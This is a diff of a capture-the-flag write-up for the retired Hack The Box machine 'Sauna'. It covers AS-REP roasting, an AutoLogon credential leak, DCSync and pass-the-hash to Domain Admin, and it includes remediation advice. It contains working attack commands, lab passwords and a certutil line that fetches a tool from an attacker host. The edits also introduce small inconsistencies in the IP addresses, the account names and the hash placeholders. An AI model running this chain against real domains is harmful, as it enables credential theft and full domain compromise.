@@ -6,25 +6,21 @@
 | **Difficulty** | Easy |
 | **OS** | Windows (Active Directory) |
 | **Status** | ✅ Retired |
-| **Key techniques** | Username generation from OSINT, AS-REP Roasting, AutoLogon credential harvesting, DCSync |
+| **Key techniques** | Username OSINT, AS-REP Roasting, AutoLogon credential leak, DCSync |
 
 ---
 
 ## TL;DR
 
-Sauna's website lists employee full names, which is enough to derive a
-realistic username list without any internal access. That list feeds an
-AS-REP Roast, cracking the password for a user with Kerberos
-pre-authentication disabled. A local enumeration script on that user's shell
-turns up a second account's password stored in cleartext via Windows
-AutoLogon — a classic "found creds lying around" win. BloodHound shows that
-second account holds the `DS-Replication-Get-Changes-All` extended right,
-which is precisely what's needed for a DCSync attack — pulling every hash in
-the domain, including the Administrator's.
+Sauna's company website lists employee full names, which I turned into a
+username list and then AS-REP roasted to get a first foothold. Running
+WinPEAS from there revealed a second account configured for AutoLogon,
+leaking its plaintext password. That second account turns out to hold
+DCSync rights on the domain, which hands over the Administrator hash.
 
 ---
 
-## Recon & Enumeration
+## Recon
 
 ```bash
 nmap -sC -sV 10.129.95.180
@@ -32,114 +28,96 @@ nmap -sC -sV 10.129.95.180
 
 ![nmap service scan](./assets/sauna/01-nmap.png)
 
-Open: HTTP (80), LDAP (389, domain `EGOTISTICAL-BANK.LOCAL`), Kerberos (88),
-SMB (445). Same signature as Forest — a domain controller — so the plan is
-enumerate the domain, not look for a web exploit.
+Results: HTTP (80), LDAP (389, domain `EGOTISTICAL-BANK.LOCAL`), Kerberos
+(88), SMB (445).
 
-**The website itself was the first useful source.** It listed employee full
-names on a staff page. Rather than guess usernames blindly, I generated the
-common corporate naming patterns from those names:
+### HTTP
 
-```
-fergus.smith / fsmith / f.smith
-shaun.coins  / scoins / s.coins
-hugo.bear    / hbear  / h.bear
-...
-```
+The website listed employee names under a "Meet the Team" section:
 
-This turns public-facing content that looks like harmless "About Us" copy
-into a username list — a reminder that AD recon doesn't stop at LDAP and SMB.
+![employee names on the company website](./assets/sauna/05-employee-names-website.png)
+
+Turned those into a username-format guess list using common patterns
+(`fergus.smith`, `fsmith`, `f.smith`, etc.) for each name.
 
 ---
 
 ## Foothold / Initial Access
 
-With a username list but no idea of the lockout policy, spraying guessed
-passwords felt too risky to try first. **AS-REP Roasting** doesn't touch the
-lockout counter and only needs valid usernames, so it was the safer first
-move:
+With a username list but no idea about the domain's password policy,
+brute-forcing felt risky. AS-REP Roasting doesn't need a password guess
+and doesn't touch the lockout counter, so that came first:
 
 ```bash
 impacket-GetNPUsers egotistical-bank.local/ -usersfile users.txt -dc-ip 10.129.95.180
 ```
 
-One of the generated usernames, `fsmith`, has Kerberos pre-authentication
-disabled — the AS-REP comes back with a crackable hash.
+![AS-REP roast attempt against the generated username list](./assets/sauna/06-asrep-roast-attempt.png)
 
-![AS-REP Roasting fsmith](./assets/sauna/02-asrep-roast.png)
-
-Cracked offline against `rockyou`:
+Got a hash for the `fsmith` user — pre-authentication was disabled on
+that account. Cracked it offline:
 
 ```bash
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
 john hash.txt -w=/usr/share/wordlists/rockyou.txt
-# fsmith:Thestrokes23
 ```
 
-Verified the credential works over WinRM before committing to a shell:
+Credentials recovered: `fsmith:Thestrokes23`. Checked they worked over
+WinRM with `crackmapexec` first, then connected:
 
 ```bash
-crackmapexec winrm 10.129.95.180 -u fsmith -p Thestrokes23 -d egotistical-bank.local
 evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
 ```
 
-Foothold as `fsmith`, user flag retrieved.
+Shell and user flag as `fsmith`.
 
 ---
 
 ## Privilege Escalation
 
-Ran an automated local enumeration script to surface common Windows
-misconfigurations rather than hunting for them all by hand:
+### Finding AutoLogon credentials
+
+Ran WinPEAS to enumerate common Windows misconfigurations:
 
 ```powershell
-# WinPEAS or equivalent
+certutil -urlcache -split -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
+.\winPEASx64.exe
 ```
 
-It flagged **AutoLogon credentials** in the registry — a second account,
-`svc_loanmgr`, configured to log on automatically with its password stored in
-cleartext.
+![WinPEAS finding AutoLogon credentials](./assets/sauna/08-autologon-creds-found.png)
 
-![AutoLogon credentials found in the registry](./assets/sauna/03-autologon-creds.png)
+WinPEAS flagged **AutoLogon credentials** configured on the box —
+`svc_loanmanager` with its password stored in cleartext in the registry.
+AutoLogon is meant for convenience, not security, and it leaves a
+plaintext credential sitting in `HKLM\...\Winlogon` for anyone with local
+access to read.
 
-This is a very common finding: AutoLogon is meant for convenience,
-not security, and it leaves a plaintext credential sitting in
-`HKLM\...\Winlogon` for anyone with local access to read.
+### DCSync via svc_loanmgr
 
-```powershell
-evil-winrm -i 10.129.95.180 -u svc_loanmgr -p '<AUTOLOGON_PASSWORD>'
-```
-
-With a second domain account in hand, the next question is the same one as
-on any AD box: what can this account reach that the last one couldn't? Ran
-BloodHound to find out:
-
-```powershell
-upload SharpHound.exe
-.\SharpHound.exe -All
-```
-
-BloodHound shows `svc_loanmgr` holds the **`DS-Replication-Get-Changes-All`**
-extended right on the domain — the specific permission that enables a
-**DCSync** attack
-
-![BloodHound showing GetChangesAll on the domain](./assets/sauna/04-bloodhound-getchanges.png) (replicate password data as if this account were a domain
-controller). That's not a coincidence you'd catch just from group membership;
-it only shows up once the ACL graph is inspected.
+Connected as the recovered account and collected BloodHound data:
 
 ```bash
-impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.95.180
+evil-winrm -i 10.129.8.203 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
-That dumps the Administrator's NTLM hash. A quick check before committing:
+In BloodHound, `svc_loanmgr` has the **`GetChangesAll`** extended right on
+the domain — DCSync rights:
+
+![BloodHound showing svc_loanmgr's GetChangesAll on the domain](./assets/sauna/09-bloodhound-getchanges.png)
+
+Used `secretsdump` to dump the Administrator hash via DCSync:
 
 ```bash
-crackmapexec smb 10.129.95.180 -u administrator -H <NT_HASH>
+impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.8.203
 ```
 
-Then pass-the-hash to a full shell:
+![secretsdump dumping domain hashes via DCSync](./assets/sauna/10-secretsdump-hashes.png)
+
+Confirmed the hash worked with `crackmapexec`, then used it directly with
+`psexec` (pass-the-hash — no need for a plaintext password):
 
 ```bash
-impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes <LM_HASH>:<NT_HASH>
+impacket-psexec egotistical-bank.local/administrator@10.129.8.203 -hashes <NTLM_HASH>:<NTLM_HASH>
 ```
 
 Domain Admin, root flag retrieved.
@@ -148,28 +126,42 @@ Domain Admin, root flag retrieved.
 
 ## Lessons Learned
 
-- **Public-facing content is domain recon.** An "About Us" staff page turned
-  into a working username list — OSINT against the org, not just the host.
-- **AS-REP Roasting again proved cheaper than spraying** when the lockout
-  policy is unknown. It's become a reflex first move on any AD box.
-- **AutoLogon is a credential leak by design.** Any time I see it configured,
-  I treat the registry key as a plaintext password waiting to be read.
-- **A single extended right (`DS-Replication-Get-Changes-All`) is
-  functionally equivalent to Domain Admin.** BloodHound is what makes that
-  visible — checking group membership manually would have missed it entirely.
+- A company's own "About us" / team page is a legitimate username source
+  — real names map to predictable AD username conventions more often than
+  not.
+- AS-REP Roasting is worth trying against *any* generated username list
+  before committing to a password spray, since it can't trigger a
+  lockout.
+- AutoLogon registry keys are a recurring, easy privesc win on Windows —
+  always worth an automated check (WinPEAS or equivalent) rather than
+  manual searching.
+- DCSync rights can end up on an ordinary-looking service account, not
+  just Domain Admins — BloodHound is the only reliable way to see who
+  actually holds them.
 
 ---
 
 ## Remediation
 
-- Avoid listing full employee names on public pages, or assume they will be
-  turned into a username list and harden Kerberos accordingly (enforce
-  pre-authentication, strong password policy).
-- Never configure Windows AutoLogon on production or domain-joined hosts —
-  the password is trivially recoverable from the registry.
-- Audit `DS-Replication-Get-Changes` / `-All` rights the same way you'd audit
-  Domain Admins membership — grant them to as few principals as possible and
-  review regularly.
+- Don't list full employee names publicly if usernames follow a
+  predictable pattern derived from them — or at least don't reuse that
+  pattern for AD accounts.
+- Enable Kerberos pre-authentication on every account.
+- Never configure AutoLogon with a plaintext password in the registry;
+  use a credential vault or managed service account instead.
+- Restrict DCSync (`GetChanges`/`GetChangesAll`) rights to actual domain
+  controller computer accounts, and audit regularly.
+
+---
+
+## Tools used
+
+- `nmap`
+- Impacket (`GetNPUsers`, `secretsdump`, `psexec`)
+- `john`, `hashcat`
+- `crackmapexec`, `evil-winrm`
+- WinPEAS
+- SharpHound / BloodHound
 
 ---
 
